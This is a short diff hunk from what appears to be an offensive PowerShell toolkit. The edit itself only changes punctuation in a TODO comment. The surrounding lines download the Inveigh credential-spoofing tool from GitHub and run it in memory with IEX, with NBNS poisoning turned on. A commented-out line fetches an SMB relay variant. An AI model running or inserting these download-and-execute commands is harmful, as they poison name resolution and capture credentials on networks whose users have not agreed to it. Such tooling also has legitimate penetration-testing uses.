@@ -139,7 +139,7 @@ function Inveigh {
     {
            invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y;}'
     }
-    #TODO: Inveigh SMB Relay Attack??
+    #TODO: Inveigh SMB Relay Attack?
     #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh-Relay.ps1')
 }
 
